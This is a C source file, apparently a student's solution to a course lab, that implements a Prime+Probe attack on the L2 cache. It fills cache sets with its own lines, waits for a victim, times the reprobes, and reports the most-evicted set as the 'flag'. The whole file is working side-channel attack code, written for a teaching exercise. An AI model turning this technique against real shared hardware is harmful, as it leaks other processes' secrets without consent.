#include "common.h"
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define BUFF_SIZE (1 << 21)
#define NSESTS 1024
#define NWAYS 12 // as long as >= 4
#define ROUNDS 100
#define THRESHOLD 150
#define WAITCYCLES 800

// waits n cycles
static void wait(int n)
{
    while (n--)
        asm volatile("" ::: "memory");
}

int main()
{
    void *buf =
        mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE,
             MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
    if (buf == (void *)-1)
    {
        perror("mmap() error\n");
        exit(EXIT_FAILURE);
    }
    memset(buf, 0x1, BUFF_SIZE);

    // Warmup
    for (int i = 0; i < 1000000; i++)
        measure_one_block_access_time((uint64_t)buf);

    int flag = -1;

    // TODO: Implement your attack here
    // Target L2

    // per-set "slow" score across many rounds
    // a slow probe means the victim evicted us from that set => it uses it
    long score[NSESTS] = {0};

    srand(time(NULL) ^ getpid());

    for (int r = 0; r < ROUNDS; r++)
    {
        for (int s = 0; s < NSESTS; s++)
        {
            // NWAYS lines that all map to L2 set s
            // same set bits (s << 6), different tag (k << 16)
            ADDR_PTR addr[NWAYS];
            for (int k = 0; k < NWAYS; k++)
                addr[k] = (ADDR_PTR)buf + ((ADDR_PTR)s << 6) + ((ADDR_PTR)k << 16);

            // shuffle so the prefetcher can't predict our accesses
            // fisher yates shuffle
            for (int k = NWAYS - 1; k > 0; k--)
            {
                int j = rand() % (k + 1);
                ADDR_PTR t = addr[k];
                addr[k] = addr[j];
                addr[j] = t;
            }

            // prime: fill the set with our own lines
            for (int k = 0; k < NWAYS; k++)
                measure_one_block_access_time(addr[k]);

            // wait for the victim to run
            wait(WAITCYCLES);

            // reshuffle before probing
            for (int k = NWAYS - 1; k > 0; k--)
            {
                int j = rand() % (k + 1);
                ADDR_PTR t = addr[k];
                addr[k] = addr[j];
                addr[j] = t;
            }

            // probe: a slow line was evicted by the victim
            for (int k = 0; k < NWAYS; k++)
            {
                CYCLES t = measure_one_block_access_time(addr[k]);
                if (t > THRESHOLD)
                    score[s]++;
            }
        }
    }

    // the most-evicted set is the flag
    long best = -1;
    for (int s = 0; s < NSESTS; s++)
        if (score[s] > best)
        {
            best = score[s];
            flag = s;
        }

    printf("Flag: %d\n", flag);
    return 0;
}
